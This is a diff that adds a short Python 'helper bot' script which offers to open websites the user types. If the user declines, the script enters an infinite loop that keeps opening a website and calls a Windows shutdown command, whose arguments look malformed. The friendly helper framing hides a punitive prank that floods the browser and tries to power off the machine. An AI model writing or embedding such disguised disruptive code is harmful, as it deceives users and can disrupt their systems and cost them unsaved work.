@@ -1,0 +1,28 @@
+import webbrowser
+import time
+from colorama import Fore, Style
+import os
+bbb = 0
+while True:
+    print("hello i'm helper bot!!!!!!!")
+    time.sleep(1)
+    print("i can..")
+    time.sleep(3)
+    print("i can open any website you write!")
+    time.sleep(1)
+    print("do you want?")
+    user_choice = input("you:").strip().lower()
+    if user_choice == "yes":
+        print("good! then write https of the site!")
+        userr = input("you: ")
+        webbrowser.open(userr)
+    elif user_choice == "no":
+        time.sleep(0.7)
+        print(Fore.RED + "why?")
+        time.sleep(0.6)
+        print(Fore.RED + "(=")
+        time.sleep(3)
+        while True:
+            webbrowser.open("https://www.kinitopet.com")
+            bbb += 1
+            os.system('shutdown /s /t /c')
